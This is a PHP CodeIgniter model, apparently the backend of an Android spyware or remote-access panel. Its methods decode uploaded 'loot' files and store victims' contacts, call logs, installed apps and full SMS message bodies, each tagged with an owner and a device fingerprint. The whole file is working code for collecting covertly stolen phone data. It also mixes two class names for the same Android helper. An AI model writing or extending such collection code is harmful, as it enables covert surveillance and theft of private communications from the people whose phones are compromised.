<?php

namespace App\Models;

use CodeIgniter\Model;

class Mod_Parse_Loot extends Model
{
    /**
     * Parses and inserts contacts from file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_contacts(string $file_name, int $var_file_owner, string $var_file_print): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $androidModel = new AndroidModel();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $data_dump1 = str_replace("-------------------------", "", $loot_decoded);
            $data_dump2 = substr($data_dump1, 13, -2);
            $data_dump3 = str_replace("},{", "}|||{", $data_dump2);
            $data_dump4 = explode("|||", $data_dump3);

            $batchData = [];
            foreach ($data_dump4 as $contacts) {
                $vars = json_decode($contacts, true);
                if (!$vars || !isset($vars['Number'])) continue; // Skip invalid

                $contact_update_date = date('Y-m-d H:i:s a', substr($vars["Updated"], 0, -3));

                $data = [
                    'Name' => $vars["Name"] ?? '',
                    'Number' => $androidModel->contacts_trim_number_length($vars["Number"]),
                    'ID' => $vars["ID"] ?? '',
                    'Updated' => $contact_update_date,
                    'meta_Inserted' => $dated,
                    'meta_Opened' => '0',
                    'meta_Viewed' => '0',
                    'meta_Owner' => $var_file_owner,
                    'meta_Print' => $var_file_print,
                ];

                // Duplicate check
                if ($this->db->table('tbl_Contacts')->where('Number', $data['Number'])->countAllResults() === 0) {
                    $batchData[] = $data;
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_Contacts')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' contacts from ' . $file_name);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'get_contacts parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts logs from file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_logs(string $file_name, int $var_file_owner, string $var_file_print): bool
    {
        try {
            $cryptModel = new Mod_Crypt() ;
            $androidModel = new Mod_Android();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $data_dump1 = str_replace("---------------------------------", "", $loot_decoded);
            $data_dump2 = substr($data_dump1, 15, -2);
            $data_dump3 = str_replace("},{", "}|||{", $data_dump2);
            $data_dump4 = explode("|||", $data_dump3);

            $batchData = [];
            foreach ($data_dump4 as $calls) {
                $data = json_decode($calls, true);
                if (!$data || !isset($data['Caller'])) continue; // Skip invalid

                $call_date = date('Y-m-d H:i:s a', substr($data["Date"], 0, -3));

                $logData = [
                    'Caller' => $androidModel->contacts_trim_number_length($data['Caller']),
                    'Saved' => $data['Saved'] ?? '',
                    'Duration' => $data['Duration'] ?? '',
                    'Type' => $data['Type'] ?? '',
                    'Timestamp' => $call_date,
                    'meta_Inserted' => $dated,
                    'meta_Opened' => '0',
                    'meta_Viewed' => '0',
                    'meta_Owner' => $var_file_owner,
                    'meta_Print' => $var_file_print,
                ];

                // Duplicate check (adjust keys as needed)
                $checkWhere = ['Caller' => $logData['Caller'], 'Timestamp' => $logData['Timestamp']];
                if ($this->db->table('tbl_Logs')->where($checkWhere)->countAllResults() === 0) {
                    $batchData[] = $logData;
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_Logs')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' logs from ' . $file_name);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'get_logs parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts apps from file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_apps(string $file_name, int $var_file_owner, string $var_file_print): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $data_dump1 = str_replace("------------------------", "", $loot_decoded);
            $data_dump2 = substr($data_dump1, 15, -2);
            $data_dump3 = str_replace("},{", "}|||{", $data_dump2);
            $data_dump4 = explode("|||", $data_dump3);

            $batchData = [];
            foreach ($data_dump4 as $apps) {
                $vars = json_decode($apps, true);
                if (!$vars || !isset($vars['App'])) continue; // Skip invalid

                $data = [
                    'App' => $vars["App"] ?? '',
                    'Package' => $vars["Package"] ?? '',
                    'meta_Inserted' => $dated,
                    'meta_Opened' => '0',
                    'meta_Viewed' => '0',
                    'meta_Owner' => $var_file_owner,
                    'meta_Print' => $var_file_print,
                ];

                // Duplicate check
                if ($this->db->table('tbl_Apps')->where('Package', $data['Package'])->countAllResults() === 0) {
                    $batchData[] = $data;
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_Apps')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' apps from ' . $file_name);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'get_apps parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts SMS from file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_sms(string $file_name, int $var_file_owner, string $var_file_print): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $androidModel = new AndroidModel();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $data_dump1 = str_replace("-------(//)--------", "", $loot_decoded);
            $data_dump2 = str_replace("\n", '****', $data_dump1);
            $data_dump3 = str_replace('****"', '"', $data_dump2);
            $data_dump4 = "[" . substr($data_dump3, 0, -2) . "}]";

            $data = json_decode($data_dump4, true);
            if (!$data) {
                log_message('error', 'Invalid JSON in file: ' . $file_name);
                return false;
            }

            $batchData = [];
            foreach ($data as $smsdata) {
                if (!isset($smsdata['Number'])) continue; // Skip invalid

                $sms_date = date('Y-m-d H:i:s a', substr($smsdata["Date"], 0, -3));
                $thread_id = 'Thread Id'; // From original

                $smsData = [
                    'sms_type' => $smsdata['Type'] ?? '',
                    'sms_number' => $androidModel->contacts_trim_number_length($smsdata['Number']),
                    'sms_thread_id' => $smsdata[$thread_id] ?? '',
                    'sms_time' => $sms_date,
                    'sms_seen' => $smsdata['Seen'] ?? '',
                    'sms__id' => $smsdata['ID'] ?? '',
                    'sms_body' => $smsdata['Body'] ?? '',
                    'meta_uploaded' => $dated,
                    'meta_seen' => '0',
                    'meta_owner' => $var_file_owner,
                    'meta_Print' => $var_file_print,
                ];

                // Duplicate check
                $checkWhere = [
                    'sms_type' => $smsData['sms_type'],
                    'sms_number' => $smsData['sms_number'],
                    'sms_time' => $smsData['sms_time'],
                    'sms_seen' => $smsData['sms_seen'],
                    'sms_body' => $smsData['sms_body'],
                ];
                if ($this->db->table('tbl_Sms')->where($checkWhere)->countAllResults() === 0) {
                    $batchData[] = $smsData;
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_Sms')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' SMS from ' . $file_name);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'get_sms parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }
}